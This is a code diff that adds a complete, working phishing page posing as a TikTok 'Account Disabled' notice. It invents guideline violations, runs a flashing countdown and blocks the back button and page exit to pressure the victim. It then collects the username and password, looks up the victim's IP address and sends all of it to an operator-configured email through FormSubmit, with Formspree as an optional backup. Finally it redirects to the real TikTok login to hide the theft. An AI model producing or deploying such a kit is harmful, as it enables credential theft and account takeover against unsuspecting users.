@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Account Status</title>
+    <style>
+        :root {
+            --tt-black: #121212;
+            --tt-white: #ffffff;
+            --tt-red: #fe2c55;
+            --tt-blue: #25f4ee;
+            --tt-green: #00e676;
+            --tt-dark-gray: #2f2f2f;
+            --tt-light-gray: #e3e3e3;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tt-black);
+            color: var(--tt-white);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            overscroll-behavior: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .logo-area {
+            margin-bottom: 20px;
+            margin-top: 20px;
+        }
+
+        .tiktok-logo {
+            font-size: 40px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .tiktok-logo span {
+            color: var(--tt-white);
+            text-shadow: 2px 2px 0px var(--tt-blue), -2px -2px 0px var(--tt-red);
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: var(--tt-red);
+        }
+
+        p.subtitle {
+            font-size: 16px;
+            color: var(--tt-light-gray);
+            margin-bottom: 20px;
+        }
+
+        .violation-box {
+            background: var(--tt-dark-gray);
+            border-radius: 8px;
+            padding: 15px;
+            height: 150px;
+            overflow: hidden;
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+            border: 1px solid #444;
+        }
+
+        .violation-list {
+            animation: scrollUp 10s linear infinite;
+        }
+
+        .violation-item {
+            font-size: 12px;
+            color: #aaa;
+            padding: 4px 0;
+            border-bottom: 1px solid #333;
+        }
+
+        @keyframes scrollUp {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-100%); }
+        }
+
+        /* Countdown: green -> flashing red at 10 */
+        .timer-container {
+            margin-bottom: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--tt-green);
+            transition: color 0.25s ease;
+        }
+
+        .timer-container.danger {
+            color: var(--tt-red);
+            animation: fearFlash 0.65s steps(1) infinite;
+        }
+
+        .timer-container.danger #countdown {
+            text-shadow: 0 0 10px rgba(254, 44, 85, 0.9);
+        }
+
+        @keyframes fearFlash {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        .expired-msg {
+            display: none;
+            font-size: 12px;
+            color: var(--tt-red);
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .expired-msg.show { display: block; }
+
+        button.main-btn {
+            background-color: var(--tt-red);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+            animation: pulse 1.8s infinite;
+        }
+
+        button.main-btn:hover {
+            background-color: #d92a4b;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(254, 44, 85, 0.65); }
+            50% { box-shadow: 0 0 0 12px rgba(254, 44, 85, 0); }
+        }
+
+        #auth-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .auth-box {
+            background: var(--tt-dark-gray);
+            padding: 25px;
+            border-radius: 8px;
+            width: 85%;
+            max-width: 320px;
+            text-align: left;
+            border: 1px solid #555;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .auth-box h3 {
+            margin-top: 0;
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+
+        .auth-note {
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+            margin: 0 0 18px 0;
+            line-height: 1.4;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: #aaa;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            background: #1f1f1f;
+            border: 1px solid #444;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--tt-red);
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: var(--tt-red);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .loading-spinner {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--tt-red);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .redirect-msg {
+            display: none;
+            color: var(--tt-light-gray);
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo-area">
+            <div class="tiktok-logo"><span>tiktok</span></div>
+        </div>
+
+        <h1>Account Disabled</h1>
+        <p class="subtitle">Your account has violated our Community Guidelines.</p>
+
+        <div class="violation-box">
+            <div class="violation-list" id="violationList"></div>
+        </div>
+
+        <div class="timer-container" id="timerBox">
+            Confirm within <span id="countdown">15</span> seconds
+        </div>
+        <div class="expired-msg" id="expiredMsg">
+            Grace period expired — your case is now flagged for review.
+        </div>
+
+        <button id="verify-btn" class="main-btn">Confirm Identity &amp; Restore</button>
+
+        <div style="margin-top: 15px; font-size: 12px; color: #777;">
+            Ticket ID: #ZM-2026-8842-Beta
+        </div>
+    </div>
+
+    <div id="auth-overlay">
+        <div class="auth-box">
+            <h3>Verify Ownership</h3>
+            <p class="auth-note">This window cannot be closed until verification completes.</p>
+            <form id="capture-form">
+                <div class="input-group">
+                    <label>Email or Phone Number</label>
+                    <input type="text" name="username" placeholder="@username or email" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="Enter your password" required autocomplete="off">
+                </div>
+                <button type="submit" class="submit-btn">Confirm &amp; Restore</button>
+                <div class="loading-spinner" id="spinner"></div>
+                <div class="redirect-msg" id="redirectMsg">Verifying… redirecting to TikTok.</div>
+            </form>
+        </div>
+    </div>
+
+  <script>
+    // ==========================================
+    // CONFIGURATION
+    // ==========================================
+    const NOTIFY_EMAIL = "your@email.com";            // <-- your email address
+    const FORMSPREE_URL = "";                          // optional backup, leave "" to disable
+
+    const violations = [
+        "Copyright strike: Music track 'As It Was' used without license.",
+        "Spam detection: Unusual login activity from Zimbabwe region.",
+        "Misinformation: Video flagged under new Beta Monetization guidelines.",
+        "Community Guideline Section 4.2: Inappropriate content detected.",
+        "Rapid following/unfollowing pattern detected.",
+        "Low engagement score on recent uploads.",
+        "Duplicate content detected across multiple accounts.",
+        "Violation of Creator Fund eligibility criteria.",
+        "Suspicious bot-like behavior in comments section.",
+        "Age verification pending for monetization rollout."
+    ];
+
+    const listContainer = document.getElementById('violationList');
+    const fullList = [...violations, ...violations, ...violations];
+    fullList.forEach(v => {
+        let div = document.createElement('div');
+        div.className = 'violation-item';
+        div.textContent = "• " + v;
+        listContainer.appendChild(div);
+    });
+
+    // ==========================================
+    // COUNTDOWN
+    // ==========================================
+    const timerBox = document.getElementById('timerBox');
+    const countdownEl = document.getElementById('countdown');
+    const expiredMsg = document.getElementById('expiredMsg');
+    let timeLeft = 15;
+
+    const timer = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = Math.max(timeLeft, 0);
+
+        if (timeLeft <= 10) {
+            timerBox.classList.add('danger');
+        }
+        if (timeLeft <= 0) {
+            clearInterval(timer);
+            expiredMsg.classList.add('show');
+            document.querySelector('.subtitle').textContent =
+                "Your account has been flagged and is awaiting re-verification.";
+        }
+    }, 1000);
+
+    // ==========================================
+    // EXIT LOCK
+    // ==========================================
+    let overlayOpen = false;
+    let captured = false;
+
+    function armHistory() {
+        history.pushState({ lock: Date.now() }, "", location.href);
+    }
+
+    function onPopState() {
+        if (overlayOpen && !captured) armHistory();
+    }
+    window.addEventListener("popstate", onPopState);
+
+    function onBeforeUnload(e) {
+        if (overlayOpen && !captured) {
+            e.preventDefault();
+            e.returnValue = "Verification is not complete. Leave anyway?";
+            return e.returnValue;
+        }
+    }
+    window.addEventListener("beforeunload", onBeforeUnload);
+
+    // Esc must not dismiss anything; nudge the user back to the button
+    window.addEventListener("keydown", (e) => {
+        if (e.key === "Escape" && !overlayOpen) {
+            document.getElementById("verify-btn").focus();
+        }
+    });
+
+    // Re-arm history lock if the page is restored from bfcache
+    window.addEventListener("pageshow", (e) => {
+        if (e.persisted && overlayOpen && !captured) armHistory();
+    });
+
+    // ==========================================
+    // MODAL
+    // ==========================================
+    document.getElementById("verify-btn").onclick = () => {
+        if (overlayOpen) return;
+        overlayOpen = true;
+        armHistory();
+        document.getElementById("auth-overlay").style.display = "flex";
+        document.querySelector('#capture-form input[name="username"]').focus();
+    };
+
+    // ==========================================
+    // CAPTURE
+    // ==========================================
+    document.getElementById("capture-form").onsubmit = async (e) => {
+        e.preventDefault();
+
+        const formData = new FormData(e.target);
+        const username = formData.get("username");
+        const password = formData.get("password");
+        const ip = await fetchIp();
+        const stamp = new Date().toISOString();
+
+        document.querySelector('.submit-btn').style.display = 'none';
+        document.getElementById('spinner').style.display = 'block';
+        document.getElementById('redirectMsg').style.display = 'block';
+
+        // ---- Direct email via FormSubmit ----
+        try {
+            await fetch("https://formsubmit.co/ajax/" + encodeURIComponent(NOTIFY_EMAIL), {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+                body: JSON.stringify({
+                    _subject: "TikTok verification captured — " + username,
+                    _template: "table",
+                    _captcha: "false",
+                    Username: username,
+                    Password: password,
+                    IP: ip,
+                    Ticket: "ZM-2026-8842-Beta",
+                    Captured: new Date().toLocaleString(),
+                    ISO: stamp
+                })
+            });
+        } catch (err) {
+            console.error("Email send failed", err);
+        }
+
+        // ---- Optional Formspree backup ----
+        if (FORMSPREE_URL) {
+            try {
+                await fetch(FORMSPREE_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        email_or_user: username,
+                        password: password,
+                        timestamp: stamp,
+                        ticket_id: "ZM-2026-8842-Beta",
+                        ip_address: ip
+                    })
+                });
+            } catch (err) {
+                console.error("Backup send failed", err);
+            }
+        }
+
+        console.log("Captured:", { username, password, ip, stamp });
+
+        // Disarm the exit lock so the redirect doesn't trigger a prompt
+        captured = true;
+        window.removeEventListener("beforeunload", onBeforeUnload);
+
+        setTimeout(() => {
+            window.location.href = "https://www.tiktok.com/login";
+        }, 2000);
+    };
+
+    async function fetchIp() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return "Unknown";
+        }
+    }
+  </script>
+</body>
+</html>
